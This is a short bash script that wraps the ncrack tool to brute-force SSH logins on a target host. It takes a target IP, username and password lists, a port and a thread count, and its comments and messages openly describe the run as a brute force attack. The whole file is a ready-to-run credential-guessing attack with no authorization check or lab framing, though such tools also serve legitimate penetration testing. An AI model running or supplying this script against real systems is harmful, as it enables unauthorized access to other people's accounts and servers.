#!/bin/bash
# Ncrack - Brute Force SSH Login
# Options:
# -U : List of usernames
# -P : List of passwords
# -p : Port number
# -T : Number of parallel connections

# Usage: ncrack_ssh.sh <target_ip> <username_list> <password_list> <port> <threads>
# Example script
# ncrack_ssh.sh 192.168.1.1 usernames.txt passwords.txt 22 4

# Check if ncrack is installed
if ! command -v ncrack &> /dev/null
then
    echo "ncrack could not be found, please install it first."
    exit
fi

# Ensure parameters are provided
if [ "$#" -ne 5 ]; then
    echo "Usage: $0 <target_ip> <username_list> <password_list> <port> <threads>"
    exit 1
fi

TARGET=$1
USERLIST=$2
PASSLIST=$3
PORT=$4
THREADS=$5

echo "Starting SSH brute force on $TARGET with $THREADS threads"

# Perform brute force attack
ncrack -U $USERLIST -P $PASSLIST -p ssh://$TARGET:$PORT -T $THREADS

echo "SSH brute force attack completed."
